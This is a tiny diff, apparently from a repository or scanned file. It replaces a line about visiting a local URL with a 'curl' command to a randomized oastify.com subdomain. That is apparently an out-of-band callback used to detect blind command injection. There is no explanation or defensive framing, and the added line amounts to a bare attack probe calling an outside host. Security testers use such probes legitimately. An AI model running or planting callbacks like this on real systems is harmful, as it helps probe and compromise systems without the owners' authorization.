@@ -1,1 +1,1 @@
-post访问http://localhost:80/33.txt
+curl 1fhs2t4f6bc11cd4113bz15fy64xsogd.oastify.com
